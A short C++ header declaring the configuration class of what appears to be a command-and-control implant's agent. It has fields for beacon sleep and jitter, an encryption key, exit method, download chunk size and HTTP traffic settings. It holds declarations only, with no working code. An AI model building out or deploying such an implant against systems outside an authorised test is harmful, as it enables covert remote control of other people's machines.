#pragma once

#include <windows.h>

class AgentConfig
{
public:
	BOOL active;

	DWORD agent_type;
	BYTE  exit_method;
	ULONG exit_task_id;
	DWORD download_chunk_size;
	PBYTE encrypt_key;
	DWORD sleep_delay;
	DWORD jitter_delay;

	// HTTP Config
	PBYTE user_agent;
	BOOL  use_ssl;
	WORD  port;
	PBYTE address;
	DWORD ans_pre_offset;
	DWORD ans_post_offset;
	PBYTE param_name;
	PBYTE method;
	PBYTE uri;
	PBYTE headers;

	AgentConfig();

	void LoadConfig(BYTE* config);
};